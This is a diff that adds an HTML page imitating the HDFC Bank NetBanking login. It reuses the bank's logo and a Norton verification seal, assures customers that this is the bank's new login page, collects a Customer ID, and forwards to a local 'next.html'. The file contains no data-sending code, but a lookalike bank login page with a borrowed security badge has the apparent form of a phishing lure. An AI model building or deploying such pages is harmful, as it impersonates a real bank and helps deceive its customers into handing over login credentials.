@@ -1,0 +1,130 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HDFC Bank NetBanking</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      background-color: white;
+      padding: 30px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    header img {
+      height: 25px;
+    }
+    .login-box {
+      display: flex;
+      justify-content: space-between;
+    }
+    .left, .right {
+      width: 48%;
+    }
+    .left input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-shadow: inset 0 0 3px #0073e6;
+    }
+    .left button {
+      width: 100%;
+      background-color: #0073e6;
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .message-box {
+      background-color: #e5f1fb;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .links {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .links a {
+      color: #0073e6;
+      margin-right: 10px;
+      text-decoration: none;
+    }
+    footer {
+      background-color: #002663;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      margin-top: 30px;
+      font-size: 14px;
+    }
+    .right img {
+      height: 40px;
+    }
+    .right p {
+      font-size: 14px;
+    }
+    .right a {
+      color: #0073e6;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h2>Welcome to HDFC Bank NetBanking</h2>
+      <img src="https://www.hdfcbank.com/assets/images/hdfc_logo.jpg" alt="HDFC Logo">
+    </header>
+    <div class="login-box">
+      <div class="left">
+        <h3>Login to NetBanking</h3>
+        <label for="customer-id">Customer ID/ User ID</label>
+        <input type="text" id="customer-id" placeholder="Enter your Customer ID">
+        <a href="#">Forgot Customer ID</a>
+        <button onclick="window.location.href='next.html'">CONTINUE</button>
+        <div class="message-box">
+          <p>Dear Customer,<br>
+          Welcome to the new login page of HDFC Bank NetBanking. Its lighter look and feel is designed to give you the best possible user experience. Please continue to login using your customer ID and password.</p>
+        </div>
+        <div class="links">
+          <p>Don't have a HDFC Bank Savings Account?</p>
+          <a href="#">Credit Card only? Login here</a>
+          <a href="#">Prepaid Card only ? Login here</a><br>
+          <a href="#">Retail Loan only? Login here</a>
+          <a href="#">HDFC Ltd. Home Loans? Login here</a>
+          <a href="#">HDFC Ltd. Deposits? Login here</a>
+        </div>
+      </div>
+      <div class="right">
+        <img src="https://www.symantec.com/content/dam/symantec/images/logos/norton-checked-verified.png" alt="Norton">
+        <p>Your security is of utmost importance. <a href="#">Know More...</a></p>
+        <h4>First Time User?</h4>
+        <a href="#">Register Now</a> for a host of convenient features
+        <h4>We have added a host of new features!</h4>
+        <ul>
+          <li>Anywhere access through Desktop or mobile</li>
+          <li>Enhanced security measures</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <footer>
+    &copy; Copyright HDFC Bank Ltd. | Terms and Conditions | Privacy Policy
+  </footer>
+</body>
+</html>
